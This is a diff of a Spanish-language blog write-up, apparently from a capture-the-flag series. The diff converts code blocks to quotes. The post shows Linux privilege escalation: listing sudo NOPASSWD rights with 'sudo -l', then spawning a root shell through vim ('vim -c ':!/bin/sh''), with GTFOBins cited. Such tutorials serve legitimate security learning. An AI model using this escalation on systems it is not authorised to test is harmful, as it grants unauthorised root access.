@@ -45,25 +45,23 @@ Puedo ejecutar comandos, ahora pruebo:
 
 En uno de esos retos aprendí que si conocemos los comandos que podemos ejecutar como root, podemos abusar de ellos (Shebi’s credit). Entonces, listamos aquellos comandos con privilegios de root que tenemos permitido ejecutar sin contraseña. En otras palabras, qué comandos puede ejecutar como súper usuario el usuario www-data, o cualquier otro con el que ingresemos. Para esto, ejecutamos el comando
 
-```sh
-sudo -l
-```
+> sudo -l
+
 
 Si existen comandos que podemos ejecutar como root sin uso de password, podemos abusar de estos. Imaginémos el siguente escenario:
 
-```sh
- sudo -l
- bronxi@flux:~$ sudo -l
 
- Coincidiendo entradas por defecto para bronxi en flux:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+>  sudo -l
+>  bronxi@flux:~$ sudo -l
 
- El usuario bronxi puede ejecutar los siguientes comandos en flux:
+>  Coincidiendo entradas por defecto para bronxi en flux:
+>     env_reset, mail_badpass,
+>     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
- (root) NOPASSWD: /usr/bin/find
- (root) NOPASSWD: /usr/bin/vim
-```
+>  El usuario bronxi puede ejecutar los siguientes comandos en flux:
+
+>  (root) NOPASSWD: /usr/bin/find
+>  (root) NOPASSWD: /usr/bin/vim
 
 Existen dos comandos que podemos ejecutar como root sin la necesidad de la clave: find y vim. ¿Cómo abusamos de ellos? Encontramos información detallada de cualquiera de estos dos comandos y muchísimos más en
 
@@ -71,12 +69,12 @@ https://gtfobins.github.io
 
 A modo de ejemplo, seleccionemos “vim”, ejecutamos
 
-```sh
- vim -c ':!/bin/sh'
- # whoami
- root
- #
-```
+
+>  vim -c ':!/bin/sh'
+>  # whoami
+>  root
+>  #
+
 Y ya podemos ejecutar como root. Fácil, ¿cierto?
 
 En breve, publicaré cómo sigue nuestra lista mágica.
